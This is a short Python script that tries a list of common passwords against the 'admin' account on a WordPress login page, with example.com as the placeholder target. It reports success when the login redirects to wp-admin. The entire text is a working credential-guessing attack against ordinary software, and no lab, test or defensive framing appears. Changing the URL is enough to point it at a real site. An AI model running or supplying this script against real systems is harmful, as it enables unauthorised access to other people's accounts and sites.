import requests

url = 'http://example.com/wp-login.php'
username = 'admin'
passwords = ['123456', 'password', 'admin123']  # List of common passwords

for password in passwords:
    data = {
        'log': username,
        'pwd': password,
        'wp-submit': 'Log In',
        'redirect_to': f'{url}/wp-admin',
        'testcookie': '1'
    }
    response = requests.post(url, data=data)
    if 'wp-admin' in response.url:
        print(f'Password found: {password}')
        break
else:
    print('No password found in the list')
